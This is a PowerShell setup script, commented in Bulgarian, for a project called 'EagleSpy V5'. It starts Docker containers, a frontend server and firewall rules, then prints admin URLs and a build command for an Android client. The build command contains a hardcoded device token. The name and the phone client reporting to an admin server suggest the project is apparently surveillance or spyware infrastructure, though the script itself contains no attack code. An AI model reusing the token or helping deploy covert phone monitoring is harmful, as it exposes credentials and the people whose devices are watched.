# EagleSpy V5 - Complete Setup and Start Script
# Конфигурира мрежата, firewall, стартира Docker и Frontend

param(
    [switch]$SkipFirewall,
    [switch]$SkipDocker,
    [switch]$SkipFrontend
)

Write-Host @"
╔══════════════════════════════════════════════════════════════╗
║                    EagleSpy V5 Starter                       ║
║                   Complete System Setup                      ║
╚══════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan

# Проверка за admin права
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n⚠️  ВНИМАНИЕ: Скриптът не е стартиран като Administrator" -ForegroundColor Yellow
    Write-Host "   Firewall конфигурацията ще бъде пропусната." -ForegroundColor Yellow
    $SkipFirewall = $true
}

# Стъпка 1: Network Info
Write-Host "`n🌐 [1/4] Мрежова информация..." -ForegroundColor Cyan
$ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.*"}
Write-Host "   Налични IP адреси:" -ForegroundColor White
foreach ($ip in $ipAddresses) {
    Write-Host "   - $($ip.IPAddress) ($($ip.InterfaceAlias))" -ForegroundColor White
}

# Прочитане на RAILS_HOST от .env
$envPath = Join-Path $PSScriptRoot ".env"
if (Test-Path $envPath) {
    $envContent = Get-Content $envPath
    $railsHost = ($envContent | Where-Object { $_ -match "^RAILS_HOST=" }) -replace "RAILS_HOST=", ""
    Write-Host "`n   ✅ Конфигурирано IP от .env: $railsHost" -ForegroundColor Green
}
else {
    Write-Host "`n   ⚠️  .env файлът не е намерен!" -ForegroundColor Yellow
}

# Стъпка 2: Firewall Configuration
if (-not $SkipFirewall) {
    Write-Host "`n🔥 [2/4] Конфигуриране на Firewall..." -ForegroundColor Cyan
    & "$PSScriptRoot\configure-firewall.ps1"
}
else {
    Write-Host "`n⏭️  [2/4] Firewall конфигурация пропусната" -ForegroundColor Yellow
}

# Стъпка 3: Docker Compose
if (-not $SkipDocker) {
    Write-Host "`n🐳 [3/4] Стартиране на Docker Compose..." -ForegroundColor Cyan
    
    # Проверка дали Docker работи
    try {
        docker version | Out-Null
        Write-Host "   ✅ Docker Desktop работи" -ForegroundColor Green
    }
    catch {
        Write-Host "   ❌ Docker Desktop не е стартиран!" -ForegroundColor Red
        Write-Host "   Моля, стартирай Docker Desktop и опитай отново." -ForegroundColor Yellow
        exit 1
    }
    
    Push-Location "$PSScriptRoot\docker"
    
    Write-Host "   📦 Спиране на стари контейнери..." -ForegroundColor White
    docker-compose down 2>&1 | Out-Null
    
    Write-Host "   🚀 Стартиране на нови контейнери..." -ForegroundColor White
    docker-compose up -d
    
    if ($LASTEXITCODE -eq 0) {
        Write-Host "   ✅ Docker контейнерите са стартирани" -ForegroundColor Green
        
        Write-Host "`n   📊 Статус на контейнерите:" -ForegroundColor White
        docker-compose ps
    }
    else {
        Write-Host "   ❌ Грешка при стартиране на Docker" -ForegroundColor Red
        Pop-Location
        exit 1
    }
    
    Pop-Location
}
else {
    Write-Host "`n⏭️  [3/4] Docker стартиране пропуснато" -ForegroundColor Yellow
}

# Стъпка 4: Frontend Dev Server
if (-not $SkipFrontend) {
    Write-Host "`n⚛️  [4/4] Стартиране на Frontend Dev Server..." -ForegroundColor Cyan
    
    $frontendPath = Join-Path $PSScriptRoot "frontend"
    
    if (Test-Path $frontendPath) {
        Write-Host "   📦 Инсталиране на dependencies..." -ForegroundColor White
        Push-Location $frontendPath
        
        npm install --silent
        
        Write-Host "   🚀 Стартиране на Vite dev server..." -ForegroundColor White
        Write-Host "   Frontend ще бъде достъпен на: http://192.168.1.13:5173" -ForegroundColor Green
        Write-Host "   Натисни Ctrl+C за спиране." -ForegroundColor Yellow
        
        Start-Sleep -Seconds 2
        npm run dev
        
        Pop-Location
    }
    else {
        Write-Host "   ⚠️  Frontend директорията не е намерена" -ForegroundColor Yellow
    }
}
else {
    Write-Host "`n⏭️  [4/4] Frontend стартиране пропуснато" -ForegroundColor Yellow
}

Write-Host @"

╔══════════════════════════════════════════════════════════════╗
║                      🎉 Готово!                             ║
╚══════════════════════════════════════════════════════════════╝

📡 URL Адреси:
   - Rails Admin UI : http://192.168.1.13:8080/admin
   - Frontend Dev   : http://192.168.1.13:5173
   - Jaeger Tracing : http://192.168.1.13:16686
   - WebSocket      : ws://192.168.1.13:8080/cable

📱 Android APK Build:
   cd android-client
   .\gradlew assembleRelease \
     -PserverBaseUrl="http://192.168.1.13:8080" \
     -PdeviceToken="418b899a24ccbdc545cf5a91dda8fc8674363dc43d14b91eee0092142b8b0933"

📚 Документация: NETWORK_CONFIGURATION.md

"@ -ForegroundColor Green
